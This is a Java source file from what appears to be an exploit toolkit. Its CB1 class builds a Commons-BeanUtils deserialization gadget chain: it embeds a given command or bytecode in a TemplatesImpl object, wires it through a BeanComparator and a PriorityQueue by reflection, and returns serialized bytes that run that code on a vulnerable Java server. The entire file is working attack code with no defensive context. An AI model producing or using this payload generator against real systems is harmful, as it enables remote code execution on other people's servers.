package cn.safe6.payload.shortPayload.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

@SuppressWarnings("all")
public class CB1 extends Payload {
    public static byte[] getPayloadUseCommand(String cmd) {
        byte[] code = Generator.getTemplateImplBytes(cmd);
        return getPayloadUseByteCodes(code);
    }

    public static byte[] getPayloadUseByteCodes(byte[] byteCodes) {
        try {
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{byteCodes});
            setFieldValue(templates, "_name", "t");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
            final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
            final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
            queue.add("1");
            queue.add("1");
            setFieldValue(comparator, "property", "outputProperties");
            setFieldValue(queue, "queue", new Object[]{templates, templates});
            return serialize(queue);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new byte[]{};
    }
}
